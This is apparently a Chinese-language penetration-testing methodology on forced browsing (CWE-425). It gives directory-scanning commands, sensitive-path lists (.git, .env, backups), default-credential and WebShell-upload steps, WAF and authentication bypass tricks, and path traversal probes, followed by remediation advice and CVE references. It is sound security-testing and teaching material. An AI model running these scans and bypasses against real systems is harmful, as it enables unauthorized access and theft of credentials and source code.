# 强制浏览攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的强制浏览（Force Browsing）攻击检测与利用流程，帮助发现因缺少访问控制而暴露的敏感页面、目录和功能。

## 1.2 适用范围

本文档适用于所有 Web 应用，特别是那些：
- 依赖"隐藏"URL 进行安全保护的系统
- 存在管理后台但未正确保护的应用
- 有备份文件、配置文件等敏感资源遗留的系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

强制浏览（也称为强制目录枚举、强制文件访问）是指攻击者通过系统化地请求 URL 路径，发现并访问那些本应受限但实际未受保护的页面和资源。

**本质问题**：
- 依赖"隐蔽式安全"（Security by Obscurity）
- 缺少统一的访问控制机制
- 敏感资源未正确保护或删除

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-425 | 直接请求（强制浏览） |
| CWE-200 | 敏感信息暴露 |
| CWE-538 | 文件和目录信息暴露 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险资源 | 潜在危害 |
|---------|---------|---------|
| 管理后台 | `/admin`, `/manage` | 获取管理权限 |
| 开发测试 | `/test`, `/dev`, `/debug` | 暴露测试功能和数据 |
| 备份文件 | `.bak`, `.old`, `.sql` | 获取源码和配置 |
| 版本控制 | `/.git`, `/.svn` | 获取完整源码历史 |
| 配置文件 | `/config`, `/.env` | 获取敏感配置和凭证 |
| 日志文件 | `/logs`, `/access.log` | 获取访问记录和敏感信息 |

## 2.3 漏洞发现方法

### 2.3.1 自动化目录扫描

**工具推荐**

```bash
# Gobuster
gobuster dir -u https://target.com -w common.txt -x php,txt,html

# Dirb
dirb https://target.com /usr/share/wordlists/dirb/common.txt

# FFUF
ffuf -w wordlist.txt -u https://target.com/FUZZ

# Feroxbuster
feroxbuster -u https://target.com -w wordlist.txt
```

**常用字典**

| 字典名称 | 用途 | 大小 |
|---------|------|------|
| common.txt | 通用目录 | ~2000 行 |
| directory-list-2.3-medium.txt | 中等规模扫描 | ~22 万行 |
| raft-large-directories.txt | 大型目录扫描 | ~30 万行 |
| assetnote.txt | 现代 Web 应用 | 持续更新 |

### 2.3.2 手工探测技巧

**常见敏感路径**

```
# 管理相关
/admin
/administrator
/manage
/manager
/console
/dashboard

# 开发相关
/dev
/test
/debug
/staging
/backup

# 框架相关
/wp-admin          (WordPress)
/phpmyadmin        (phpMyAdmin)
/actuator          (Spring Boot)
/api-docs          (Swagger)

# 版本控制
/.git
/.svn
/.hg
/.DS_Store

# 配置文件
/.env
/config.php
/web.config
/application.yml
```

### 2.3.3 响应分析

| 状态码 | 含义 | 后续操作 |
|-------|------|---------|
| 200 OK | 资源存在 | 深入分析内容 |
| 301/302 | 重定向 | 跟踪重定向目标 |
| 401/403 | 需要认证/禁止 | 尝试绕过或暴力破解 |
| 404 | 不存在 | 继续扫描其他路径 |
| 500 | 服务器错误 | 可能存在漏洞 |

## 2.4 漏洞利用方法

### 2.4.1 管理后台利用

```bash
# 1. 发现管理后台
GET /admin  → 302 到登录页

# 2. 尝试默认凭证
POST /admin/login
username: admin
password: admin

# 3. 利用管理功能
- 用户管理：添加管理员账户
- 配置管理：修改系统配置
- 文件管理：上传 WebShell
```

### 2.4.2 敏感文件下载

```bash
# 备份文件
GET /backup.sql
GET /database.bak
GET /config.php.old

# 版本控制
GET /.git/config
GET /.git/HEAD

# 配置文件
GET /.env
GET /config/database.yml
```

### 2.4.3 源码泄露利用

**Git 源码恢复**

```bash
# 使用 GitHack 等工具恢复源码
git clone https://github.com/lijiejie/GitHack
python GitHack.py https://target.com/.git/

# 恢复后审计：
# 1. 搜索硬编码凭证
# 2. 查找安全漏洞
# 3. 了解系统架构
```

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

**技巧 1：URL 编码**

```bash
# 原始请求被拦截
GET /admin

# URL 编码绕过
GET /%61dmin
GET /ad%6din
GET /%%36%31dmin
```

**技巧 2：路径混淆**

```bash
# 使用双斜杠
GET //admin

# 使用点号
GET /admin/.
GET /admin/..;/

# 使用分号
GET /admin;
```

### 2.5.2 认证绕过

**技巧 3：HTTP 方法绕过**

```bash
# POST 绕过认证
POST /admin HTTP/1.1
# 可能返回 200 而 GET 返回 401
```

**技巧 4：HTTP 头注入**

```bash
# 添加特殊请求头
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### 2.5.3 隐藏资源发现

**技巧 5：机器人文件分析**

```bash
# 检查 robots.txt 和 sitemap.xml
GET /robots.txt
# 可能包含隐藏的敏感路径

GET /sitemap.xml
# 可能列出所有页面
```

**技巧 6：JavaScript 文件分析**

```bash
# 从 JS 文件中提取 API 端点
GET /static/js/app.js
# 搜索：/api/, /admin/, /v1/
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 路径示例 | 说明 |
|-----|---------|------|
| 管理后台 | `/admin`, `/manage` | 管理功能入口 |
| 备份文件 | `*.bak`, `*.old`, `*.sql` | 备份和临时文件 |
| 版本控制 | `/.git`, `/.svn` | 版本控制目录 |
| 配置文件 | `/.env`, `/config.php` | 配置文件 |
| 日志文件 | `/logs/`, `*.log` | 日志文件 |
| 测试页面 | `/test`, `/dev` | 测试功能 |

## 3.2 扫描命令速查

```bash
# 快速扫描
gobuster dir -u https://target.com -w common.txt

# 带扩展名扫描
gobuster dir -u https://target.com -w common.txt -x php,txt,html

# 深度扫描
gobuster dir -u https://target.com -w large.txt --depth 3

# 排除特定状态码
gobuster dir -u https://target.com -w common.txt --exclude-length 1234
```

## 3.3 修复建议

1. **实施统一访问控制** - 所有页面都应经过认证和授权检查
2. **删除敏感资源** - 移除备份文件、测试页面、示例应用
3. **禁用目录列表** - 配置 Web 服务器禁用目录浏览
4. **使用 WAF** - 部署 Web 应用防火墙检测和阻止扫描行为
5. **实施默认拒绝** - 未明确允许的访问应默认拒绝

## 3.4 CWE-425 直接请求测试

### 3.4.1 测试原理

CWE-425（Direct Request / Forced Browsing）是指 Web 应用程序未能对所有受限的 URL、脚本或文件充分执行适当的授权检查。

**核心问题**：
- 应用假设资源只能通过给定导航路径访问
- 仅在路径的某些特定点应用授权检查
- 攻击者可通过直接请求 URL 绕过这些检查

### 3.4.2 测试方法

**步骤 1：识别受限资源**
```
识别以下类型的资源：
- 管理页面：/admin/*, /manage/*
- 配置页面：/config/*, /settings/*
- 用户数据：/users/*, /profiles/*
- 系统功能：/system/*, /debug/*
```

**步骤 2：直接访问测试**
```bash
# 直接访问管理页面（绕过正常导航）
curl http://target.com/admin/users
curl http://target.com/admin/config

# 检查响应
# 200 OK → 可能存在漏洞
# 302/401 → 有重定向或认证要求
# 403 → 有访问控制
```

**步骤 3：参数篡改测试**
```bash
# 修改 URL 路径参数
GET /app/getappInfo          # 正常用户功能
GET /app/admin_getappInfo    # 尝试管理员功能

# 修改文件路径参数
GET /files?name=user.txt
GET /files?name=../admin.txt
```

### 3.4.3 CAPEC 攻击模式参考

| CAPEC-ID | 攻击模式 | 说明 |
|---------|---------|------|
| CAPEC-127 | Directory Indexing | 目录索引探测 |
| CAPEC-143 | Detect Unpublicized Web Pages | 探测未公开网页 |
| CAPEC-144 | Detect Unpublicized Web Services | 探测未公开 Web 服务 |
| CAPEC-87 | Forceful Browsing | 强制浏览 |

### 3.4.4 已知 CVE 案例

| CVE | 描述 |
|-----|------|
| CVE-2022-29238 | 文档协作工具访问控制不当，虽阻止目录列出但无法阻止直接访问 |
| CVE-2004-2144 | 通过直接请求绕过认证 |
| CVE-2005-1654 | 通过直接请求绕过授权 |
| CVE-2005-1668 | 通过直接请求访问特权功能 |
| CVE-2002-1798 | 通过直接请求上传任意文件 |

---

**参考资源**：
- [OWASP Testing Guide - Directory Enumeration](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger - Forced Browsing](https://portswigger.net/web-security)
- [CWE-425: Direct Request](https://cwe.mitre.org/data/definitions/425.html)
- [CAPEC-87: Forceful Browsing](https://capec.mitre.org/data/definitions/87.html)
